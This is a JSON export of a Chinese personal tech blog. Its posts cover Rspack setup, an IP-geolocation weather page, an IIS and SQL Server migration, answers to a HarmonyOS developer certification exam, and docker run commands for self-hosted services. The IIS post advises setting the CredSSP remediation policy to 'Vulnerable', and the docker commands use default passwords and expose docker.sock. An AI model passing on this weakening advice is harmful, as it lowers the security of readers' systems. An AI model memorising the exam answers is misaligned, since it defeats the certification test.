打包工具，它提供对 webpack 生态良好的兼容性能够无缝替换 webpack，并提供闪电般的构建速度。 为什么要做 Rspack创建 Rspack 的原因，是为了解决在字节跳动维护构建工具时遇到的各种性能问题。在字节跳动内部存在许多巨石应用，它们都具有复杂的构建配置，生产环境的构建需要耗费十几分钟，甚至超过半小时;开发环境的耗时也超过十几分钟。我们在 webpack 上尝试了多种方法来优化这些巨石应用，但是效果甚微。我们意识到在 webpack 上的优化已经难以为继，必须要从底层改造，才能适应我们的需求。同时在聆听解决业务各种复杂的构建需求中，我们意识到开发人员对构建工具有以下要求:快速的 Dev 启动性能 npm run dev 是开发者每天需要运行很多次的命令，但大型项目每次都需和要等待 10分钟，这对于工程师来说非常痛苦，因此优化开发模式下启动的时间至关重要高效的 Build 性能 npm run bui1d 经常在 CI&#x2F;CD 环境中运行，它决定了应用生产交付的效率,有些应用在生产环境中需要 20 到 30 分钟的构建时间，如果能缩短这段时间，对开发流程也将非常有帮助。灵活的配置 用户工程的配置非常灵活，不够统一。在之前的尝试中，将webpack配置迁移到其他构建工具时，我们遇到了许多问题，因为其他构建工具的配置不如 webpack 灵活。生产环境的优化能力 在启用 Rspack之前，我们尝试了社区内的各种方案，但它们都面临着一定程度的生产环境负优化，例如拆分包不够精细等。因此，优化生产环境的产物是我们不可放弃的功能。在确定了这四个需求后，我们调查了社区中的所有技术方案，它们通常都能很好的满足其中个别需求但没有一个方案能同时满足所有条件，因此，我们决定自研 Rspack。 和 webpack 的区别webpack是目前最为成熟的构建工具，有着活跃的生态，灵活的配置和丰富的功能，但是其最为人诟病的是其性能问题，尤其在一些大型项目上，构建花费的时间可能会达到几分钟甚至几十分钟，&lt;&lt;&lt;性能问题是目前 webpack 最大的短板。因此 Rspack 解决的问题核心就是webpack 的性能问题。 Rspack 比webpack 快得益于如下几方面:Rust 语言优势: Rspack 使用 Rust 语言编写，得益于 Rust的高性能编译器支持， Rust 编译生成的 Native Code 通常比JavaScript 性能更为高效。高度并行的架构: webpack 受限于JavaScript 对多线程的赢弱支持，导致其很难进行高度的并行化计算，而得益于 Rust语言的并行化的良好支持，Rspack采用了高度并行化的架构，如模块图生成，代码生成等阶段，都是采用多线程并行执行，这使得其编译性能随着 CPU核心数的增长而增长，充分挖掘 CPU的多核优势。内置大部分的功能: 事实上 webpack 本身的性能足够高效，但是因为 webpack 本身内置了较少的功能，这使得我们在使用 webpack 做现代 Web App 开发时，通常需要配合很多的 plugin 和loader 进行使用，而这些loader和 plugin 往往是性能的瓶颈，而 Rspack 虽然支持loader 和plugin，但是保证绝大部分常用功能都内置在Rspack内，从而减小Spluginlloader 导致的低性能和通信开销问题，增量编译: 尽管 Rspack 的全量编译足够高效，但是当项目庞大时，全量的编译仍然难以满足 HMR的性能要求，因此在 HMR 阶段，我们采用的是更为高效的增量编译策略，从而保证，无论你的项目多大，其 HMR 的开销总是控制在合理范围内。 和 Vite 的区别Vite提供了很好的开发者体验，但 Vite 在生产构建中依赖了 Rollup，因此与其他基于JavaScript 的工具链一样，面临着生产环境的构建性能问题。另外，Rollup相较于 webpack做了一些平衡取舍，在这里同样适用。比如，Rollup缺失了 webpack对于拆包的灵活性，即缺失了 optimization.splitChunks提供的很多功能。 和 esbuild 的区别我们在内部进行过大规模地将 esbuild作为通用的 Web App 构建工具的实践，但是遇到如下一些问题:缺乏对 JavaScript HMR 和增量编译的良好支持，这导致大型项目中的 HMR 性能较差。拆包策略也非常原始，难以满足业务复杂多变的拆包优化需求。 Rspack快速上手环境准备在开始使用前， 需要安装 Node.js&gt;&#x3D;16 版本，推荐使用 Node,js LTS 版本 1node -v 创建新项目 使用 RsbuildRsbuip 是由 Rspack 驱动的高性能构建工具，由 Rspack 团队开发，它默认包含了一套精心设计的构建配置，提供开箱即用的开发体验，并能够充分发挥出 Rspack的性能优势。 我们推荐使用 Rsbuild来创建新项目，执行如下命令即可: 1npm create rsbuild@latest 或者 1yarn create rsbuild 或者 1pnpm create rsbuildalatest 或者 1bun create rsbuildalatest 123456789101112◇ Project name or path│ test│◇ Select framework│ Vue 3│◇ Select language│ TypeScript│◇ Select additional tools (Use &lt;space&gt; to select, &lt;enter&gt; to continue)(enter)│ none 123456│◇ Next steps ──╮│ ││ cd test ││ npm install ││ npm run dev ││ │ 1npm run build package.json 1&quot;scripts&quot;: &#123; &quot;ast&quot;: &quot;rsbuild dev --open&quot;&#125; npm run ast dependencies 生产devDependencies 安装 rsbuild.config.ts 1234567891011export default defineConfig(&#123; plugins: [pluginVue()], server:&#123; port:8116,//开发服务器端口 open:true,//是否自动打开浏览器 proxy:&#123;//代理设置 &#125; &#125;&#125;); tsconfig.json 12 &quot;target&quot;: &quot;ES2020&quot;, 编译的js版本 &quot;include&quot;: [&quot;src&quot;] 包含目录 安装element-plus1npm install element-plus -s 或者 1yarn add element-plus 或者 1pnpm insta1l element-plus index.ts 1234567import&#123;createApp&#125;from &quot;vue&quot;;import ElementPlus from&quot;element-plus&quot;import &quot;element-plus/dist/index.css&quot;import App from &quot;./App.vue&quot;;import&#x27;/index.css&#x27;;createApp(App).use(ElementPlus).mount(&#x27;#root&#x27;); .vue使用即可 配置路由 vue-router 1npm install vue-routersrc-router-index.tsconst router &#x3D; CreateRouter() index.tsadd routimport router from “.&#x2F;router”;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vue3","slug":"vue3","permalink":"https://banjinmei.github.io/tags/vue3/"}],"author":"mu"},{"title":"Loacl IP get Weather","slug":"Loacl-IP-get-Weather","date":"2024-11-05T22:22:53.000Z","updated":"2024-11-05T22:37:33.426Z","comments":true,"path":"2024/11/06/Loacl-IP-get-Weather/","permalink":"https://banjinmei.github.io/2024/11/06/Loacl-IP-get-Weather/","excerpt":"","text":"通过当前网络IP获取天气~ 获取天气的接口地址：https://weather.sl.al/ 参数：https://weather.sl.al/?lat=22.2783&amp;lon=114.1747 &amp;lang&#x3D;en lat：纬度 lon：经度 lang：语言 (默认不带 lang 的话为中文) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166&#123; &quot;lat&quot;: &quot;22.2783&quot;, &quot;lon&quot;: &quot;114.1747&quot;, &quot;location&quot;: &#123; &quot;city&quot;: &quot;湾仔&quot;, &quot;region&quot;: &quot;湾仔区&quot; &#125;, &quot;current&quot;: &#123; &quot;temperature&quot;: 22, &quot;feelsLike&quot;: 20, &quot;description&quot;: &quot;阴&quot;, &quot;airQuality&quot;: &#123; &quot;category&quot;: &quot;差&quot;, &quot;statement&quot;: &quot;空气污染已经达到了很高水平，对敏感人群是不健康的。如果您感到呼吸困难或喉咙刺激等症状，应减少户外活动时间。&quot; &#125; &#125;, &quot;sun&quot;: &#123; &quot;duration&quot;: &quot;11 hrs 13 mins&quot;, &quot;sunrise&quot;: &quot;AM6:30&quot;, &quot;sunset&quot;: &quot;PM5:43&quot; &#125;, &quot;hourly&quot;: [ &#123; &quot;time&quot;: &quot;上午7时&quot;, &quot;temperature&quot;: 23, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;上午8时&quot;, &quot;temperature&quot;: 24, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;上午9时&quot;, &quot;temperature&quot;: 25, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;上午10时&quot;, &quot;temperature&quot;: 26, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;上午11时&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午12时&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午1时&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午2时&quot;, &quot;temperature&quot;: 28, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午3时&quot;, &quot;temperature&quot;: 28, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午4时&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午5时&quot;, &quot;temperature&quot;: 26, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;下午6时&quot;, &quot;temperature&quot;: 26, &quot;rainProbability&quot;: &quot;0%&quot; &#125; ], &quot;daily&quot;: [ &#123; &quot;date&quot;: &quot;2024-11-06&quot;, &quot;high&quot;: 28, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;部分晴，天气宜人&quot;, &quot;nightDescription&quot;: &quot;大部分晴，有风&quot;, &quot;rainProbability&quot;: &quot;11%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-07&quot;, &quot;high&quot;: 28, &quot;low&quot;: 20, &quot;dayDescription&quot;: &quot;大部分晴，微风&quot;, &quot;nightDescription&quot;: &quot;部分多云，微风&quot;, &quot;rainProbability&quot;: &quot;19%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-08&quot;, &quot;high&quot;: 28, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;大部分晴，天气宜人&quot;, &quot;nightDescription&quot;: &quot;主要为晴&quot;, &quot;rainProbability&quot;: &quot;2%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-09&quot;, &quot;high&quot;: 27, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;部分晴，天气宜人&quot;, &quot;nightDescription&quot;: &quot;主要为晴&quot;, &quot;rainProbability&quot;: &quot;2%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-10&quot;, &quot;high&quot;: 28, &quot;low&quot;: 22, &quot;dayDescription&quot;: &quot;晴，天气宜人&quot;, &quot;nightDescription&quot;: &quot;晴朗潮湿&quot;, &quot;rainProbability&quot;: &quot;6%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-11&quot;, &quot;high&quot;: 29, &quot;low&quot;: 24, &quot;dayDescription&quot;: &quot;晴朗潮湿&quot;, &quot;nightDescription&quot;: &quot;主要为晴，暖和潮湿&quot;, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-12&quot;, &quot;high&quot;: 26, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;晴&quot;, &quot;nightDescription&quot;: &quot;主要为晴&quot;, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-13&quot;, &quot;high&quot;: 26, &quot;low&quot;: 20, &quot;dayDescription&quot;: &quot;晴&quot;, &quot;nightDescription&quot;: &quot;晴朗潮湿&quot;, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-14&quot;, &quot;high&quot;: 26, &quot;low&quot;: 20, &quot;dayDescription&quot;: &quot;晴朗潮湿&quot;, &quot;nightDescription&quot;: &quot;晴朗潮湿&quot;, &quot;rainProbability&quot;: &quot;2%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-15&quot;, &quot;high&quot;: 26, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;晴朗潮湿&quot;, &quot;nightDescription&quot;: &quot;晴朗潮湿&quot;, &quot;rainProbability&quot;: &quot;1%&quot; &#125; ]&#125; 获取经纬度接口获取当前网络经纬度的免费且稳定的接口有几个选择。这些接口通常提供基于IP地址的服务，能够返回访问者的大致地理位置信息，包括经纬度。请注意，基于IP地址的服务精度有限，特别是在城市范围内，因为它们依赖于ISP提供的数据。以下是一些常用的免费API选项： 1. ip-api.comURL: http://ip-api.com/json方法: GET返回值: JSON格式的数据，包含国家、地区、城市、邮编、经纬度等信息。 2. ipinfo.ioURL: https://ipinfo.io/json方法: GET返回值: JSON格式的数据，包括IP地址、城市、区域、国家、位置（经纬度）、组织等信息。 3. freegeoip.appURL: https://api.freegeoip.app/json/方法: GET请求头: 需要加入 Accept-Language: en 和 User-Agent: YourAppName，其中 YourAppName 应用的名字。返回值: JSON格式的数据，包括IP、国家代码、国家名、地区、城市、邮政编码、纬度、经度等信息。 使用示例 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Get Current Position&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button onclick=&quot;getLocation()&quot;&gt;Get Location&lt;/button&gt; &lt;p id=&quot;location&quot;&gt;&lt;/p&gt; &lt;script&gt; function getLocation() &#123; fetch(&#x27;https://ipinfo.io/json&#x27;) .then(response =&gt; response.json()) .then(data =&gt; &#123; const location = document.getElementById(&#x27;location&#x27;); location.textContent = `Latitude: $&#123;data.loc.split(&#x27;,&#x27;)[0]&#125;, Longitude: $&#123;data.loc.split(&#x27;,&#x27;)[1]&#125;`; &#125;) .catch(error =&gt; console.error(&#x27;Error:&#x27;, error)); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 两者结合 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Weather Information&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; margin: 20px; &#125; .section &#123; margin-bottom: 20px; &#125; .header &#123; font-size: 18px; font-weight: bold; &#125; .details &#123; margin-left: 20px; &#125; .hourly-forecast &#123; display: flex; flex-wrap: wrap; &#125; .hourly-item &#123; border: 1px solid #ccc; padding: 10px; margin: 5px; width: 150px; &#125; .daily-forecast &#123; display: flex; flex-wrap: wrap; &#125; .daily-item &#123; border: 1px solid #ccc; padding: 10px; margin: 5px; width: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;button onclick=&quot;getWeather()&quot;&gt;Get Weather&lt;/button&gt; &lt;div id=&quot;weather-info&quot; class=&quot;section&quot;&gt;&lt;/div&gt; &lt;script&gt; function getWeather() &#123; // 获取经纬度 fetch(&#x27;https://ipinfo.io/json&#x27;) .then(response =&gt; response.json()) .then(data =&gt; &#123; const lat = data.loc.split(&#x27;,&#x27;)[0]; const lon = data.loc.split(&#x27;,&#x27;)[1]; // 使用经纬度调用天气API return fetch(`https://weather.sl.al/?lat=$&#123;lat&#125;&amp;lon=$&#123;lon&#125;`); &#125;) .then(response =&gt; response.json()) .then(weatherData =&gt; &#123; const weatherInfo = document.getElementById(&#x27;weather-info&#x27;); weatherInfo.innerHTML = &#x27;&#x27;; // 显示当前天气 const currentWeather = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Current Weather in $&#123;weatherData.location.city&#125;&lt;/div&gt; &lt;div class=&quot;details&quot;&gt; Temperature: $&#123;weatherData.current.temperature&#125;°C&lt;br&gt; Feels Like: $&#123;weatherData.current.feelsLike&#125;°C&lt;br&gt; Description: $&#123;weatherData.current.description&#125;&lt;br&gt; Air Quality: $&#123;weatherData.current.airQuality.category&#125;&lt;br&gt; $&#123;weatherData.current.airQuality.statement&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += currentWeather; // 显示今日天气详情 const todayWeather = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Today&#x27;s Weather ($&#123;weatherData.daily[0].date&#125;)&lt;/div&gt; &lt;div class=&quot;details&quot;&gt; High: $&#123;weatherData.daily[0].high&#125;°C&lt;br&gt; Low: $&#123;weatherData.daily[0].low&#125;°C&lt;br&gt; Day: $&#123;weatherData.daily[0].dayDescription&#125;&lt;br&gt; Night: $&#123;weatherData.daily[0].nightDescription&#125;&lt;br&gt; Rain Probability: $&#123;weatherData.daily[0].rainProbability&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += todayWeather; // 显示未来几天的天气预报 const dailyForecast = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Daily Forecast&lt;/div&gt; &lt;div class=&quot;daily-forecast&quot;&gt; $&#123;weatherData.daily.slice(1).map(day =&gt; ` &lt;div class=&quot;daily-item&quot;&gt; Date: $&#123;day.date&#125;&lt;br&gt; High: $&#123;day.high&#125;°C&lt;br&gt; Low: $&#123;day.low&#125;°C&lt;br&gt; Day: $&#123;day.dayDescription&#125;&lt;br&gt; Night: $&#123;day.nightDescription&#125;&lt;br&gt; Rain Probability: $&#123;day.rainProbability&#125; &lt;/div&gt; `).join(&#x27;&#x27;)&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += dailyForecast; // 显示每小时的天气预报 const hourlyForecast = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Hourly Forecast&lt;/div&gt; &lt;div class=&quot;hourly-forecast&quot;&gt; $&#123;weatherData.hourly.map(hour =&gt; ` &lt;div class=&quot;hourly-item&quot;&gt; Time: $&#123;hour.time&#125;&lt;br&gt; Temperature: $&#123;hour.temperature&#125;°C&lt;br&gt; Rain Probability: $&#123;hour.rainProbability&#125; &lt;/div&gt; `).join(&#x27;&#x27;)&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += hourlyForecast; &#125;) .catch(error =&gt; console.error(&#x27;Error:&#x27;, error)); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 结果为当前天气、今日天气详情、未来几天的天气预报以及每小时的天气预报~（Current Weather、Today’s Weather、Daily Forecast、Hourly Forecast）","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"weather","slug":"weather","permalink":"https://banjinmei.github.io/tags/weather/"}],"author":"mu"},{"title":"IIS Web","slug":"IIS-Web","date":"2024-11-03T17:43:24.000Z","updated":"2024-11-03T17:48:42.507Z","comments":true,"path":"2024/11/04/IIS-Web/","permalink":"https://banjinmei.github.io/2024/11/04/IIS-Web/","excerpt":"","text":"IIS Web迁移mstsc远程 安装iis本地机子开启远程Err出现“身份验证错误。要求的函数不受支持。远程计算机：xxx，这可能是由于CredSSP加密Oracle修正。 运行 gpedit.msc，选择“计算机配置”-&gt;“管理模板”-&gt;“系统”-&gt;“凭据分配”，选择“加密 Oracle 修正”，改为启用，选择“易受攻击”，OK。 备份webcopy web文件夹 备份sql.bakBACKUP DATABASE [zx] TO DISK &#x3D; ‘C:\\zz.bak’; 还原sql123456789101112131415--err 因为数据库正在使用，所以无法获得对数据库的独占访问权。ALTER DATABASE zx SET SINGLE_USER WITH ROLLBACK IMMEDIATE;RESTORE DATABASE zxFROM DISK =&#x27;c:\\webx\\zx.bak&#x27;with replace,MOVE &#x27;zx&#x27; TO &#x27;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx.mdf&#x27;,MOVE &#x27;zx_log&#x27; TO&#x27;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx_log.ldf&#x27;--设置MULTI_USER模式ALTER DATABASE [zx] SET MULTI_USER; iis部署设置文件夹权限 设置xx.com跳转www.xx.com 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;system.webServer&gt; &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://www.xx.com&quot; exactDestination=&quot;true&quot; httpResponseStatus=&quot;Permanent&quot; /&gt; &lt;/system.webServer&gt;&lt;/configuration&gt;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"IIS","slug":"IIS","permalink":"https://banjinmei.github.io/tags/IIS/"}],"author":"mu"},{"title":"HarmonyOS应用开发者初级认证题目(2024.11新版，题目&答案)","slug":"HarmonyOS-test","date":"2024-10-30T16:36:03.000Z","updated":"2024-11-19T14:06:24.177Z","comments":true,"path":"2024/10/31/HarmonyOS-test/","permalink":"https://banjinmei.github.io/2024/10/31/HarmonyOS-test/","excerpt":"","text":"HarmonyOS应用开发者认证题目(2024.11新版，题目&amp;答案) c1 about 判断题 1.“一次开发，多端部署”指的是一个工程，一次开发上架，多端按需部署。为了实现这一目的，HarmonyOS提供了多端开发环境，多端开发能力以及多端分发机制。 正确(True) 2.《鸿蒙生态应用开发白皮书》全面阐释了鸿蒙生态下应用开发核心理念、关键能力以及创新体验，旨在帮助开发者快速、准确、全面的了解鸿蒙开发套件给开发者提供的能力全景和未来的愿景。 正确(True) 3.HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力。 正确(True) 单选题 1.当用户希望能够在多个设备间来回切换、完成多个任务，开发者可以使用以下哪个核心能力，以便应用不间断地给用户提供服务的能力。 C. 自由流转 2.当您希望获取到最全面、最详细的功能描述、参数说明和权限信息时，应该从（）寻找？ C. API参考 3.应用如需在多个设备上运行，需要适配不同的屏幕尺寸和分辨率、不同的交互方式（如触摸和键盘等）、不同的硬件能力（如内存差异和器件差异等），开发成本较高。“一次开发，多端部署”提供了哪个核心能力降低了多设备应用的开发成本？ B. 多端开发能力 4.如果开发者在原生应用版本的基础上，想要提供多种服务给用户，开发者选择开发场景的最优选是？ B. 开发多个元服务，按需组合为一个复杂的应用 多选题 1.下列哪些选项属于HarmonyOS三大技术理念。 A. 一次开发，多端部署B. 可分可合，自由流转C. 统一生态，原生智能 2.用户使用应用的情境发生变化时（例如从室内走到户外、从办公室到车上等），之前使用的设备可能已经不适合继续当前的任务，或者周围有更合适的设备，此时，可以选择使用新的设备来继续当前的任务。以下哪些场景适合使用跨端迁移能力？ A. 在外时手机上编辑邮件，到公司后在2in1设备上继续编辑B. 在外时手机玩游戏，到家后希望获取更好的视觉体验，在平板上继续玩C. 在家里智慧屏上看视频，当下需要出门时，可以手机上继续观看D. 手机视频通话中，到家后家中有智慧屏，可以更沉浸地视频聊天 3.下列哪些说法是正确的。 A. HUAWEI DevEco Studio 提供了设备模拟的能力，解决HarmonyOS生态应用、元服务开发过程中遇到的真机设备不足、无分布式应用调试环境等问题，为开发者提供低成本、易获取的调测验证环境B. 为了降低性能调优技术难度，HUAWEI DevEco Studio推出了场景化调优工具 DevEco ProfilerC. HUAWEI DevEco Studio提供了一系列命令行工具，辅助开发者更高效的管理 SDK 、设备，提升调试、调优的效率D. HUAWEI DevEco Studio是面向HarmonyOS生态的集成开发环境，提供了一站式的HarmonyOS生态应用开发能力 c2 DevEco Studio 判断题 1.如果代码中涉及到一些网络、数据库、传感器等功能的开发，均可使用预览器进行预览。 错误(False) 2.module.json5文件中的deviceTypes字段中，配置了phone，tablet，2in1等多种设备类型，才能进行多设备预览。 正确(True) 3.DevEco Studio支持代码自动补全、自动导包等能力。 正确(True) 1.用哪一种装饰器修饰的组件可作为页面入口组件： B. @Entry 2.ArkTS Stage模型，关于其工程目录结构说法不正确的是： D. app.json5用于编写应用级编译构建任务脚本 3.使用下面哪个hdc命令可以查看设备链接信息 B. hdc list targets 4.组件预览通过在组件前添加下面哪个注解： C. @Preview 多选题 1.关于预览器的使用，以下哪些说法是正确的： A. 在开发界面UI代码过程中，如果添加或删除了UI组件，您只需Ctrl+S进行保存，然后预览器就会立即刷新预览结果B. 在预览器界面，可以在预览器中操作应用&#x2F;服务的界面交互动作，如单击、跳转、滑动等，与应用&#x2F;服务运行在真机设备上的界面交互体验一致C. 组件预览通过在组件前添加注解@Preview实现D. 页面预览通过在工程的ets文件头部添加注解@Entry实现 2.DevEco Studio代码编辑支持下面哪些能力： A. 代码自动补齐B. 实时检查C. 跨语言跳转D. 代码引用查找E. 快速查阅API接口及组件参考文档 3.DevEco Studio支持使用多种语言进行应用&#x2F;服务的开发，包括ArkTS、JS和C&#x2F;C++。在编写应用&#x2F;服务阶段，可以通过以下哪些方法提升编码效率： A. 提供代码的智能补齐能力，编辑器工具会分析上下文并理解项目内容，并根据输入的内容，提示可补齐的类、方法、字段和关键字的名称等B. 在编辑器中调用ArkTS API接口或ArkTS&#x2F;JS组件时，支持在编辑器中快速、精准调取出对应的参考文档C. 代码格式化功能可以帮助您快速的调整和规范代码格式，提升代码的美观度和可读性D. 如果输入的语法不符合编码规范，或者出现语义语法错误，编辑器会显示错误或警告 c3 let const let stu:Array &#x3D;[‘a’,’b’];let stus:string [] &#x3D; [‘a’,’b’]; enum Color{ Red, Blue} let fvColor:Color&#x3D; Color.Red;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":"docker pro","slug":"docker-pro","date":"2024-10-26T14:43:10.000Z","updated":"2024-11-26T16:33:51.703Z","comments":true,"path":"2024/10/26/docker-pro/","permalink":"https://banjinmei.github.io/2024/10/26/docker-pro/","excerpt":"","text":"docker 运行有趣的项目 Portainer - 容器管理面板Portainer 提供了一个简单易用的 Web 界面来管理和监控 Docker 容器、镜像、网络等。你可以通过下面的命令快速启动它： 12docker volume create portainer_datadocker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce Jenkins - 持续集成服务器Jenkins 是一个流行的开源持续集成工具，用于自动化构建、测试和部署过程。可以通过以下命令启动 Jenkins： 12docker run -u root --rm -d -p 8080:8080 -p 50000:50000 -v jenkins_home:/var/jenkins_home jenkins/jenkins:ltsdocker logs &lt;containerId&gt; 管理密码 登录https://www.jenkins.io/doc/book/system-administration/viewing-logs/ Gitea - 自托管的 Git 服务Gitea 是一个轻量级的代码托管平台，适合个人或小团队使用。使用 Docker 运行 Gitea 非常简单： 1docker run -d --name gitea -p 10022:22 -p 10080:3000 -v /path/to/gitea:/data gitea/gitea:latest Nextcloud - 自建云盘Nextcloud 是一个功能强大的自托管文件同步与分享解决方案，支持多种设备访问。启动 Nextcloud 的命令如下： 1docker run -d --name nextcloud -p 8080:80 -v /path/to/nextcloud-data:/var/www/html nextcloud 设定管理密码 即可使用 Pi-hole - 广告拦截DNS服务器Pi-hole 可以帮助你拦截广告、跟踪器和其他不需要的内容，为网络浏览体验提供更好的保护。安装和运行 Pi-hole 很简单： 1docker run -d --name pihole --cap-add=NET_ADMIN --dns=127.0.0.1 --dns=8.8.8.8 -e TZ=Asia/Shanghai -p 53:53/tcp -p 53:53/udp -p 80:80 -p 443:443 -v &quot;$(pwd)&quot;/pihole:/etc/pihole -v &quot;$(pwd)&quot;/dnsmasq.d:/etc/dnsmasq.d pihole/pihole Ghost - 博客平台Ghost 是一个现代化的开源博客平台，专为出版而设计。运行 Ghost 的 Docker 容器只需要一行命令： 1docker run -d --name some-ghost -p 2368:2368 ghost Nginx - 高性能的 Web 和反向代理服务器Nginx 是一个非常流行和高效的 Web 服务器，适用于静态网站或作为反向代理服务器。启动 Nginx 非常简单： 1docker run -d --name my-nginx -p 80:80 nginx WordPress - 开源博客平台和 CMSWordPress 是世界上最受欢迎的博客平台之一，也可以用作内容管理系统 (CMS)。启动 WordPress 需要同时运行 MySQL 数据库： 12345# 启动 MySQL 数据库docker run -d --name mysql-wordpress -e MYSQL_ROOT_PASSWORD=my-secret-pw -e MYSQL_DATABASE=wordpress -e MYSQL_USER=wordpress -e MYSQL_PASSWORD=my-secret-pw mysql:5.7# 启动 WordPressdocker run -d --name wordpress --link mysql-wordpress:mysql -p 8080:80 -e WORDPRESS_DB_HOST=mysql-wordpress:3306 -e WORDPRESS_DB_USER=wordpress -e WORDPRESS_DB_PASSWORD=my-secret-pw -e WORDPRESS_DB_NAME=wordpress wordpress PostgreSQL - 强大的开源对象关系型数据库系统PostgreSQL 是一个非常强大且可靠的数据库系统。启动 PostgreSQL 非常简单： 1docker run -d --name my-postgres -e POSTGRES_PASSWORD=mysecretpassword -p 5432:5432 postgres MongoDB - 文档型 NoSQL 数据库MongoDB 是一个基于分布式文件存储的数据库，适用于大数据处理。启动 MongoDB： 1docker run -d --name my-mongo -p 27017:27017 mongo Redis - 高性能键值存储系统Redis 是一个高性能的键值数据库，常用于缓存和消息队列。启动 Redis： 1docker run -d --name my-redis -p 6379:6379 redis MinIO - 高性能的对象存储系统MinIO 是一个高性能的对象存储系统，兼容 Amazon S3 API。非常适合用来搭建私有云存储服务。启动 MinIO： 1docker run -d --name minio1 -p 9000:9000 -p 9001:9001 -e &quot;MINIO_ROOT_USER=minioadmin&quot; -e &quot;MINIO_ROOT_PASSWORD=minioadmin&quot; minio/minio server /data --console-address &quot;:9001&quot; Traefik - 现代的 HTTP 反向代理和负载均衡器Traefik 是一个现代的 HTTP 反向代理和负载均衡器，支持自动发现后端服务。启动 Traefik： 1docker run -d --name traefik -p 8080:8080 -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -v $PWD/traefik.yml:/etc/traefik/traefik.yml traefik:v2.5 注意：需要创建一个 traefik.yml 配置文件来指定 Traefik 的行为。 NetData - 实时性能监控工具NetData 是一个实时性能监控工具，可以监控服务器的各种指标。启动 NetData： 1docker run -d --name netdata -p 19999:19999 -v /host/proc:/host/proc:ro -v /etc/os-release:/host/etc/os-release:ro -v /sys:/host/sys:ro -v 